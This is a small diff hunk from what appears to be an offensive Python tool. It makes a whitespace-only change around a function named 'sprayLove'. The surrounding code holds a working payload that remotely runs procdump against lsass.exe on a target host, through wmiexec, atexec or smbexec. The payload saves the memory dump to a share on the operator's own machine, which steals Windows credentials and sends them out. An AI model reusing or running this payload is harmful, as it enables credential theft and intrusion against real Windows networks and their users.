@@ -17,7 +17,7 @@ from core.Colors import *
 def sprayLove(user, target, methods, share):
 	if not methods : methods = ['wmiexec', 'atexec', 'smbexec']
 	smb_share_name = gen_random_string(5)
-
+	
 	payload = "net use \\\\%s\\procdump\\ && \\\\%s\\procdump\\procdump64.exe -accepteula -ma lsass.exe \\\\%s\\dumps\\%s.dmp" % (retrieveMyIP(), retrieveMyIP(), retrieveMyIP(), target)
 	exec_method = None
 
